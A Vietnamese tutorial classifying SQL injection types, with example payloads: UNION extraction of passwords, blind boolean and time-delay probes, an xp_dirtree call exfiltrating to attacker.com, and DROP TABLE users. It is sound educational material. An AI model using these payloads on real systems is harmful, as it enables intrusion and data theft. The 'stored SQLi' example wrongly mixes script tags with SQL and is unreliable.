
SQL Injection (SQLi) là một trong những lỗ hổng bảo mật phổ biến và nguy hiểm nhất, cho phép kẻ tấn công can thiệp vào các truy vấn SQL được thực thi bởi ứng dụng. Có nhiều loại SQL Injection, được phân loại theo cách thức khai thác và mục tiêu tấn công.

Dưới đây là **các loại SQL Injection chính**:

---

### 1. **In-band SQL Injection (SQLi trực tiếp)**

Đây là dạng phổ biến và dễ khai thác nhất. Kẻ tấn công sử dụng cùng một kênh giao tiếp để gửi payload và nhận kết quả.

#### a. **Error-based SQLi**

- Dựa vào thông báo lỗi do hệ quản trị cơ sở dữ liệu trả về để thu thập thông tin.
- Ví dụ payload:
`' OR 1=1 ORDER BY 100--` 
    → Nếu bảng có ít hơn 100 cột, lỗi sẽ tiết lộ số lượng cột thật.


#### b. **Union-based SQLi**

- Dùng từ khóa `UNION` để hợp nhất kết quả của truy vấn hợp lệ với truy vấn do kẻ tấn công tạo.
- Ví dụ payload:
    
    `' UNION SELECT username, password FROM users--` 
    

---

### 2. **Inferential SQL Injection (Blind SQLi)**

Không thấy dữ liệu trực tiếp, nhưng kẻ tấn công quan sát **hành vi phản hồi** của ứng dụng để suy đoán.

#### a. **Boolean-based Blind SQLi**

- Dựa vào việc ứng dụng trả về khác nhau (true/false) khi chèn truy vấn đúng/sai.
    
- Ví dụ:

    
    `' AND 1=1--    → hợp lệ   ' AND 1=2--    → không hợp lệ`


#### b. **Time-based Blind SQLi**

- Truy vấn sẽ làm ứng dụng chậm lại nếu điều kiện đúng → từ đó suy đoán thông tin.
    
- Ví dụ:

    `' IF (SUBSTRING(@@version,1,1)='5') WAITFOR DELAY '0:0:5'--` 
    

---

### 3. **Out-of-band SQL Injection**

- Kẻ tấn công sử dụng một **kênh khác** để nhận dữ liệu, ví dụ DNS hoặc HTTP.
    
- Hiệu quả khi in-band hoặc inferential không hoạt động.
    
- Ví dụ: sử dụng `xp_dirtree` trong SQL Server để gửi truy vấn DNS:

    `'; exec master..xp_dirtree '\\attacker.com\share'--` 
    

---

### 4. **Stored SQL Injection (Persistent SQLi)**

- Payload được lưu vào CSDL và thực thi sau này, thường thấy ở phần comment, message,...
    
- Ví dụ:
    
    - Người dùng chèn payload vào ô comment:
        `<script>INSERT INTO logs (text) VALUES (''); DROP TABLE users--')</script>`
        

---

### 5. **Second-order SQL Injection**

- Payload không gây hại khi nhập vào nhưng sẽ được thực thi ở một truy vấn khác trong tương lai.
    
- Ví dụ: chèn `' OR 1=1 --` vào tên người dùng, và truy vấn khác dùng lại biến `username` đó mà không kiểm tra.
    

---

### Tóm tắt bảng phân loại:

|Loại SQLi|Cách hoạt động chính|Mức phổ biến|
|---|---|---|
|In-band (Error, Union)|Phản hồi trực tiếp dữ liệu/lỗi|Phổ biến|
|Blind (Boolean, Time)|Dựa vào hành vi phản hồi|Phổ biến|
|Out-of-band|Dữ liệu rò rỉ qua kênh khác|Hiếm|
|Stored / Persistent|Lưu payload vào CSDL và thực thi sau|Phổ biến|
|Second-order|Payload được kích hoạt gián tiếp|Ít phổ biến|